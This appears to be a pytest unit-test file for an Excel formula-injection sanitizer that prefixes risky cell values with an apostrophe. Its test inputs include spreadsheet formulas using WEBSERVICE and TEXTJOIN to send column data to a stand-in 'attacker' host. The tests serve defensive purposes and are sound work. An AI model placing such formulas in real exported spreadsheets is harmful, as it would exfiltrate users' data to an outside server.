"""Unit tests for the Excel formula-injection sanitizer (issue #1081 finding G)."""

import datetime

import pytest

from app.utils.excel_safety import sanitize_excel_cell


@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r", "\n"])
def test_formula_trigger_prefixed_with_apostrophe(lead):
    payload = f'{lead}WEBSERVICE("https://attacker/x")'
    out = sanitize_excel_cell(payload)
    assert out == "'" + payload
    # The apostrophe makes the cell literal text — the value no longer leads
    # with a formula trigger.
    assert out[0] == "'"


def test_real_exfiltration_payload_is_neutralized():
    payload = '=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))'
    assert sanitize_excel_cell(payload) == "'" + payload


def test_plain_string_unchanged():
    assert sanitize_excel_cell("王小明") == "王小明"
    assert sanitize_excel_cell("310460031") == "310460031"
    # A dash INSIDE the string (not leading) is fine.
    assert sanitize_excel_cell("A-123") == "A-123"


def test_empty_string_unchanged():
    assert sanitize_excel_cell("") == ""


def test_non_string_values_pass_through_untouched():
    # Numbers/bools/dates/None must keep their native type so cell formatting
    # (thousands separators, date formats) still works.
    assert sanitize_excel_cell(1234) == 1234
    assert sanitize_excel_cell(12.5) == 12.5
    assert sanitize_excel_cell(True) is True
    assert sanitize_excel_cell(None) is None
    d = datetime.date(2026, 7, 6)
    assert sanitize_excel_cell(d) is d


def test_negative_number_as_string_is_prefixed_but_as_number_is_not():
    # A negative number written as a numeric type is safe (stays numeric);
    # the same value arriving as a user-typed STRING leads with '-' and is
    # neutralized.
    assert sanitize_excel_cell(-5) == -5
    assert sanitize_excel_cell("-5") == "'-5"
